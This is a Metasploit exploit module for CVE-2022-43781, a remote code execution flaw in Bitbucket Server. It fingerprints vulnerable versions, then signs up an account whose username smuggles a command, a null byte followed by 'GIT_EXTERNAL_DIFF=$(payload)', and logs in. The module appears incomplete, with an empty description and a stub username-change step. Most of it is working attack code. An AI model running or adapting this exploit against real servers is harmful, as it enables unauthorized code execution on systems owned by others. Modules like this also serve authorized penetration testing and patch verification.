##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bitbucket Environment Variable RCE',
        'Description' => %q{
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ry0taK', # Vulnerability Discovery
          'y4er', # PoC and blog post
          'Shelby Pace' # Metasploit Module
        ],
        'References' => [
          [ 'URL', 'https://y4er.com/posts/cve-2022-43781-bitbucket-server-rce/'],
          [ 'CVE', '2022-43781']
        ],
        'Platform' => [ 'win', 'linux' ],
        'Privileged' => false,
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [ 'Automatic Target', {}],
          [ 'Linux', {}],
          [ 'Windows', {}]
        ],
        'DisclosureDate' => '2022-11-16',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(7990),
        OptString.new('USERNAME', [ false, 'User name to log in with' ]),
        OptString.new('PASSWORD', [ false, 'Password to log in with' ]),
        OptString.new('TARGETURI', [ true, 'The URI of the Bitbucket instance', '/']),
        OptBool.new('USE_PUBLIC_SIGNUP', [ true, 'Attempt to create an account through public signup if enabled', true ])
      ]
    )
  end

  def check
    # Check for Bitbucket and version if it's available
    res = request_login_page

    return CheckCode::Unknown('Failed to retrieve a response from the target') unless res
    return CheckCode::Safe('Target does not appear to be Bitbucket') unless res.body.include?('Bitbucket')

    nokogiri_data = res.get_html_document
    footer = nokogiri_data&.at('footer')
    return CheckCode::Detected('Failed to retrieve version information from Bitbucket') unless footer

    version_info = footer.at('span')&.children&.text
    return CheckCode::Detected('Failed to find version information in footer section') unless version_info

    vers_matches = version_info.match(/v(\d+\.\d+\.\d+)/)
    return CheckCode::Detected('Failed to find version info in expected format') unless vers_matches && vers_matches.length > 1

    version_str = vers_matches[1]

    vprint_status("Found version #{version_str} of Bitbucket")
    # vers_no = Rex::Version.new(version_str)
    major, minor, revision = version_str.split('.')
    rev_num = revision.to_i

    case major
    when '7'
      case minor
      when '0', '1', '2', '3', '4', '5'
        return CheckCode::Appears
      when '6'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 18
      when '7', '8', '9', '10', '11', '12', '13', '14', '15', '16'
        return CheckCode::Appears
      when '17'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 11
      when '18', '19', '20'
        return CheckCode::Appears
      when '21'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 5
      end
    when '8'
      print_status('Versions 8.* are vulnerable only if the mesh setting is disabled')
      case minor
      when '0'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '1'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 4
      when '2'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 3
      when '3'
        return CheckCode::Appears if rev_num >= 0 && rev_num <= 2
      when '4'
        return CheckCode::Appears if rev_num == 0 || rev_num == 1
      end
    end

    CheckCode::Detected
  end

  def validate_credentials(username, password)
    username ||= datastore['USERNAME']
    password ||= datastore['PASSWORD']

    [ username, password ]
  end

  def request_login_page
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'login'),
      'keep_cookies' => true
    )
  end

  # signup page will return 302 and redirect to login page
  # if public signup is disabled
  def public_signup_available?
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true
    )

    return false unless res
    return true if res.code == 200 && res.body.include?('Sign up')

    print_status('Public signup is not enabled')
    false
  end

  def create_account
    u_name = Faker::Internet.username
    email = Faker::Internet.email
    full_name = Faker::Name.name
    pass = Faker::Internet.password

    u_name_payload = "#{u_name}\u0000GIT_EXTERNAL_DIFF=$(#{payload.encoded})"

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'signup'),
      'keep_cookies' => true,
      'vars_post' => {
        'username' => u_name_payload,
        'fullname' => full_name,
        'email' => email,
        'password' => pass,
        'confirmPassword' => pass,
        'submit' => 'Sign Up'
      }
    )

    unless res && res.code == 302 && res.headers['Location'].include?('signedUp')
      fail_with(Failure::UnexpectedReply, 'Account creation failed')
    end

    print_good('Account creation was successful!')
    [ u_name_payload, pass ]
  end

  def log_in(username, password)
    res = request_login_page
    fail_with(Failure::UnexpectedReply, 'Failed to access login page') unless res&.body&.include?('login')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'j_atl_security_check'),
      'keep_cookies' => true,
      'vars_post' => {
        'j_username' => username,
        'j_password' => password,
        'submit' => 'Log in'
      }
    )

    fail_with(Failure::UnexpectedReply, 'Didn\'t retrieve a response') unless res
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'dashboard'),
      'keep_cookies' => true
    )

    fail_with(Failure::UnexpectedReply, 'No response from the dashboard') unless res
    unless res.body.include?('Logged in')
      fail_with(Failure::UnexpectedReply, 'Failed to log in. Please check credentials')
    end
  end

  def change_username; end

  def exploit
    @using_public_account = datastore['USE_PUBLIC_SIGNUP']
    if public_signup_available? && datastore['USE_PUBLIC_SIGNUP']
      username, password = create_account
      @using_public_account = (username && password ? true : false)
    end

    username, password = validate_credentials(username, password)
    fail_with(Failure::BadConfig, 'No credentials to log in with.') unless username && password

    log_in(username, password)
    unless @using_public_account
      change_username
    end
  end
end
